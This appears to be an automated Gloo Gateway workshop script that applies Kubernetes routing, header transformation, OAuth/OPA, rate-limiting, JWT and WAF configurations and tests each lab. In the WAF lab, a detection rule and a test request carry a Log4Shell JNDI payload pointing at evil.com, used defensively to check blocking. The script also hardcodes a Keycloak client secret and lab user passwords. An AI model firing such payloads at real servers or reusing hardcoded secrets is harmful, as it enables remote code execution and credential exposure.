kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/delegation/tests/https.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
      filters:
        - type: RequestHeaderModifier
          requestHeaderModifier:
            add:
              - name: Foo
                value: bar
            set:
              - name: User-Agent
                value: custom
            remove:
              - To-Remove
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("request transformations applied", () => {
  it('Checking text \'bar\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'bar', match: true }));
  it('Checking text \'custom\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'custom', match: true }));
  it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'To-Remove', match: false }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/transformations/tests/request-headers.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /publicget
      backendRefs:
        - name: httpbin1
          port: 8000
      filters:
        - type: URLRewrite
          urlRewrite:
            hostname: httpbin1.com
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /get
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("request rewrite applied", () => {
  it('Checking text \'httpbin1.com/get\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/publicget', body: 'httpbin1.com/get', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/transformations/tests/request-rewrite.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
      filters:
        - type: ResponseHeaderModifier
          responseHeaderModifier:
            add:
              - name: Foo
                value: bar
            set:
              - name: To-Modify
                value: newvalue
            remove:
              - To-Remove
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("response transformations applied", () => {
  it('Checking \'Foo\' and \'To-Modify\' headers', () => helpersHttp.checkHeaders({ host: `https://httpbin.example.com`, path: '/response-headers?to-remove=whatever&to-modify=oldvalue', expectedHeaders: [{'key': 'foo', 'value': 'bar'}, {'key': 'to-modify', 'value': 'newvalue'}]}));
  it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/response-headers?to-remove=whatever&to-modify=oldvalue', body: 'To-Remove', match: false }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/transformations/tests/response-headers.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                client:
                  header: 'User-Agent'
                  regex: '^([^/\s]+).*'
                  subgroup: 1
              headers:
                x-client:
                  text: "{{ client }}"
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("request transformation applied", () => {
  it('Checking text \'X-Client\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-agent', value: 'curl/8.5.0'}], body: 'X-Client', match: true }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/transformations/tests/x-client-request-header.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    stagedTransformations:
      regular:
        responseTransforms:
        - responseTransformation:
            transformationTemplate:
              headers:
                x-request-id:
                  text: '{{ request_header("X-Request-Id") }}'
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("response transformation applied", () => {
  it('Checking \'X-Request-Id\' header', () => helpersHttp.checkHeaders({ host: `https://httpbin.example.com`, path: '/get', expectedHeaders: [{'key': 'x-request-id', 'value': '*'}]}));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/transformations/tests/x-request-id-response-header.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: oauth
  namespace: httpbin
spec:
  configs:
    - oauth2:
        oidcAuthorizationCode:
          appUrl: "https://httpbin.example.com"
          callbackPath: /callback
          clientId: ${KEYCLOAK_CLIENT}
          clientSecretRef:
            name: oauth
            namespace: gloo-system
          issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
          logoutPath: /logout
          afterLogoutUrl: "https://httpbin.example.com/get"
          session:
            failOnFetchFailure: true
            redis:
              cookieName: keycloak-session
              options:
                host: redis:6379
          scopes:
          - email
          headers:
            idTokenHeader: jwt
          identityToken:
            claimsToHeaders:
              - claim: email
                header: X-Email
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: httpbin
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
ATTEMPTS=1
timeout 60 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://httpbin.example.com/get)" != "302" ]]; do sleep 5; done'
export USER1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user1)
export USER2_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user2)
ATTEMPTS=1
until ([ ! -z "$USER2_COOKIE" ] && [[ $USER2_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER2_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user2)
done
ATTEMPTS=1
until ([ ! -z "$USER1_COOKIE" ] && [[ $USER1_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user1)
done
echo "User1 token: $USER1_COOKIE"
echo "User2 token: $USER2_COOKIE"
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {
  const cookieString = process.env.USER1_COOKIE;

  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', retCode: 302 }));

  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 }));
});

EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/extauth-oauth/tests/authentication.test.js.liquid from lab number 8"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Claim to header is working properly", function() {
  const cookieString = process.env.USER2_COOKIE;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: 'user2@solo.io' }));
});

EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/extauth-oauth/tests/header-added.test.js.liquid from lab number 8"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: allow-solo-email-users
  namespace: httpbin
data:
  policy.rego: |-
    package test

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.state.jwt)
        endswith(payload["email"], "@solo.io")
    }
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: oauth
  namespace: httpbin
spec:
  configs:
    - oauth2:
        oidcAuthorizationCode:
          appUrl: "https://httpbin.example.com"
          callbackPath: /callback
          clientId: ${KEYCLOAK_CLIENT}
          clientSecretRef:
            name: oauth
            namespace: gloo-system
          issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
          logoutPath: /logout
          afterLogoutUrl: "https://httpbin.example.com/get"
          session:
            failOnFetchFailure: true
            redis:
              cookieName: keycloak-session
              options:
                host: redis:6379
          scopes:
          - email
          headers:
            idTokenHeader: jwt
          identityToken:
            claimsToHeaders:
              - claim: email
                header: X-Email
    - opaAuth:
        modules:
        - name: allow-solo-email-users
          namespace: httpbin
        query: "data.test.allow == true"
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {

  const cookieString_user1 = process.env.USER1_COOKIE;
  const cookieString_user2 = process.env.USER2_COOKIE;

  it("The httpbin page isn't accessible with user1", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user1 }], retCode: "keycloak-session=dummy" == cookieString_user1 ? 302 : 403 }));
  it("The httpbin page is accessible with user2", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user2 }], retCode: 200 }));

});

EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/extauth-oauth/tests/authorization.test.js.liquid from lab number 8"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: httpbin
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                organization:
                  header: 'X-Email'
                  regex: '.*@(.*)$'
                  subgroup: 1
              headers:
                x-organization:
                  text: "{{ organization }}"
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Transformation is working properly", function() {
  const cookieString = process.env.USER2_COOKIE;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: 'X-Organization' }));
});

EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/advanced-transformations/tests/header-added.test.js.liquid from lab number 9"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: limit-users
  namespace: httpbin
spec:
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: organization
            value: solo.io
        rateLimit:
          requestsPerUnit: 3
          unit: MINUTE
    rateLimits:
    - setActions:
      - requestHeaders:
          descriptorKey: organization
          headerName: X-Organization
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: httpbin
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                organization:
                  header: 'X-Email'
                  regex: '.*@(.*)$'
                  subgroup: 1
              headers:
                x-organization:
                  text: "{{ organization }}"
    rateLimitConfigs:
      refs:
      - name: limit-users
        namespace: httpbin
EOF
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Rate limiting is working properly", function() {
  const cookieString = process.env.USER2_COOKIE;
  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 429 }));
});

EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/ratelimiting/tests/rate-limited.test.js.liquid from lab number 10"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gloo.solo.io/v1
kind: Upstream
metadata:
  name: keycloak
  namespace: gloo-system
spec:
  static:
    hosts:
      - addr: ${HOST_KEYCLOAK}
        port: ${PORT_KEYCLOAK}
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    jwtProvidersStaged:
      afterExtAuth:
        providers:
          keycloak:
            issuer: ${KEYCLOAK_URL}/realms/workshop
            tokenSource:
              headers:
              - header: jwt
            jwks:
              remote:
                url: ${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/certs
                upstreamRef:
                  name: keycloak
                  namespace: gloo-system
            claimsToHeaders:
            - claim: email
              header: X-Email
EOF
export USER1_COOKIE_JWT=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=gloo-ext-auth" \
  -d "client_secret=hKcDcqmUKCrPkyDJtCw066hTLzUbAiri" \
  -d "username=user1" \
  -d "password=password" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token" |
  jq -r .access_token)
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Claim to header is working properly", function() {
  const jwtString = process.env.USER1_COOKIE_JWT;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwtString }], body: '"X-Email":' }));
  it('The new header has value', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwtString }], body: '"user1@example.com"' }));
});

EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/jwt/tests/header-added.test.js.liquid from lab number 11"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    jwtProvidersStaged:
      afterExtAuth:
        providers:
          keycloak:
            issuer: ${KEYCLOAK_URL}/realms/workshop
            tokenSource:
              headers:
              - header: jwt
            jwks:
              remote:
                url: ${KEYCLOAK_URL}/realms/workshop/protocol/openid-connect/certs
                upstreamRef:
                  name: keycloak
                  namespace: gloo-system
            claimsToHeaders:
            - claim: email
              header: X-Email
    rbac:
      policies:
        viewer:
          principals:
          - jwtPrincipal:
              claims:
                email: user2@solo.io
EOF
export USER2_COOKIE_JWT=$(curl -Ssm 10 --fail-with-body \
  -d "client_id=gloo-ext-auth" \
  -d "client_secret=hKcDcqmUKCrPkyDJtCw066hTLzUbAiri" \
  -d "username=user2" \
  -d "password=password" \
  -d "grant_type=password" \
  "$KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token" |
  jq -r .access_token)
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Only User2 can access httpbin", function() {
  const jwt1String = process.env.USER1_COOKIE_JWT;
  it('User1 access is refused', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwt1String }], body: 'RBAC: access denied' }));
  const jwt2String = process.env.USER2_COOKIE_JWT;
  it('User2 access is allowed', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'jwt', value: jwt2String }], body: '"user2@solo.io"' }));
});

EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/jwt/tests/only-user2-allowed.test.js.liquid from lab number 11"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 11"; exit 1; }

kubectl --context ${CLUSTER1} -n httpbin delete routeoption routeoption

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: waf
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    waf:
      customInterventionMessage: 'Log4Shell malicious payload'
      ruleSets:
      - ruleStr: |
          SecRuleEngine On
          SecRequestBodyAccess On
          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
EOF
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
const helpersHttp = require('./tests/chai-http');
var chai = require('chai');
var expect = chai.expect;

describe("WAF is working properly", function() {
  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
});
EOF
echo "executing test dist/document/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid from lab number 12"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 12"; exit 1; }
curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Namespace
metadata:
  name: world-cities
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: world-cities-soap-service
  namespace: world-cities
spec:
  selector:
    matchLabels:
      app: world-cities-soap-service
  replicas: 1
  template:
    metadata:
      labels:
        app: world-cities-soap-service
    spec:
      containers:
      - name: world-cities-soap-service
        image: quay.io/solo-io/world-cities-soap-service:0.0.1
        imagePullPolicy: IfNotPresent
        ports:
        - containerPort: 8080
---
apiVersion: v1
kind: Service
metadata:
  name: world-cities-soap-service
  namespace: world-cities
  labels:
    app: world-cities-soap-service
spec:
  ports:
  - port: 8080
    protocol: TCP
  selector:
    app: world-cities-soap-service
EOF
kubectl --context ${CLUSTER1} -n world-cities rollout status deploy --timeout=5m
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("World Cities application", () => {
  it('is running', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "world-cities", k8sObj: "world-cities-soap-service" }));
});
EOF
echo "executing test dist/document/build/templates/steps/apps/world-cities/deploy-and-expose-world-cities/tests/check-world-cities.test.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: world-cities
  namespace: world-cities
spec:
  parentRefs:
  - name: http
    namespace: gloo-system
    sectionName: https
  hostnames:
  - "world-cities.example.com"
  rules:
  - backendRefs:
    - name: world-cities-soap-service
      port: 8080
EOF
./scripts/register-domain.sh world-cities.example.com ${PROXY_IP}
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("World Cities service", () => {
  it('is available as SOAP', () => helpers.checkBody({
    host: `https://world-cities.example.com`,
    path: '/',
    headers: [
      { key: 'SOAPAction', value: "findCity" },
      { key: 'Content-Type', value: "application/xml" },
    ],
    method: "post",
    data: `<?xml version="1.0" encoding="UTF-8"?>
  <Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/soap/">
      <Header />
      <Body>
          <Query>
          <CityQuery>south bo</CityQuery>
          </Query>
          \
      </Body>
  </Envelope>`,
    body: 'south boston',
    match: true,
  }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/world-cities/deploy-and-expose-world-cities/tests/world-cities-exposed-soap.test.js.liquid from lab number 13"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 13"; exit 1; }
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: world-cities
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: world-cities
  options:
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            xsltTransformation:
              xslt: |
                <?xml version="1.0" encoding="UTF-8"?>
                <xsl:stylesheet
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:math="http://www.w3.org/2005/xpath-functions/math"
                xmlns:xs="http://www.w3.org/2001/XMLSchema"
                exclude-result-prefixes="xs math" version="3.0">
                  <xsl:output indent="yes" omit-xml-declaration="yes" />
                  <xsl:strip-space elements="*"/>
                  <xsl:template match="/" xmlns="http://schemas.xmlsoap.org/soap/envelope/">
                    <Envelope >
                      <Header/>
                      <Body>
                        <Query>
                          <xsl:apply-templates select="json-to-xml(.)/*"/>
                        </Query>
                      </Body>
                    </Envelope>
                  </xsl:template>
                  <xsl:template match="map" xpath-default-namespace="http://www.w3.org/2005/xpath-functions" xmlns:web="http://www.qas.com/OnDemand-2011-03">
                    <CityQuery><xsl:value-of select="string[@key='cityQuery']" /></CityQuery>
                  </xsl:template>
                </xsl:stylesheet>
              nonXmlTransform: true
              setContentType: text/xml
          responseTransformation:
            xsltTransformation:
              xslt: |
                <?xml version="1.0" encoding="UTF-8"?>
                <xsl:stylesheet
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:xs="http://www.w3.org/2001/XMLSchema"
                xpath-default-namespace="http://schemas.xmlsoap.org/soap/envelope/"
                version="3.0">
                  <xsl:output method="text" omit-xml-declaration="yes" />
                  <xsl:variable name="myMap">
                    <map xmlns="http://www.w3.org/2005/xpath-functions">
                      <array key="matches" >
                        <xsl:for-each select="/Envelope/Body/Content/Match">
                          <map>
                            <string key="city"><xsl:value-of select="City"/></string>
                            <string key="country"><xsl:value-of select="Country" /></string>
                            <string key="subCountry"><xsl:value-of select="SubCountry" /></string>
                            <string key="geoNameId"><xsl:value-of select="GeoNameId" /></string>
                          </map>
                        </xsl:for-each>
                      </array>
                    </map>
                  </xsl:variable>
                  <xsl:template match="/">
                    <xsl:apply-templates select="xml-to-json(\$myMap, map{'indent': true()})" />
                  </xsl:template>
                </xsl:stylesheet>
              setContentType: application/json
EOF
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: world-cities
  namespace: world-cities
spec:
  parentRefs:
  - name: http
    namespace: gloo-system
    sectionName: https
  hostnames:
  - "world-cities.example.com"
  rules:
  - backendRefs:
    - name: world-cities-soap-service
      port: 8080
    matches:
    - path:
        type: PathPrefix
        value: /search
    filters:
    - type: RequestHeaderModifier
      requestHeaderModifier:
        add:
        - name: SOAPAction
          value: findCity
    - type: URLRewrite
      urlRewrite:
        path:
          type: ReplacePrefixMatch
          replacePrefixMatch: /
EOF
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("World Cities service", () => {
  it('is available as REST', () => helpers.checkBody({
    host: `https://world-cities.example.com`,
    path: '/search',
    headers: [
      { key: 'Content-Type', value: "application/json" },
    ],
    method: "post",
    data: '{"cityQuery": "south bo"}',
    body: 'south boston',
    match: true,
  }));
})
EOF
echo "executing test dist/document/build/templates/steps/apps/world-cities/expose-soap-service-as-rest/tests/world-cities-exposed-rest.test.js.liquid from lab number 14"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
kubectl --context ${CLUSTER1} create ns bookinfo
kubectl --context ${CLUSTER1} -n bookinfo apply -f https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo.yaml
kubectl --context ${CLUSTER1} -n bookinfo rollout status deploy --timeout=5m
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Bookinfo app", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["productpage-v1", "ratings-v1", "details-v1", "reviews-v1", "reviews-v3"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo", k8sObj: deploy }));
  });
});
EOF
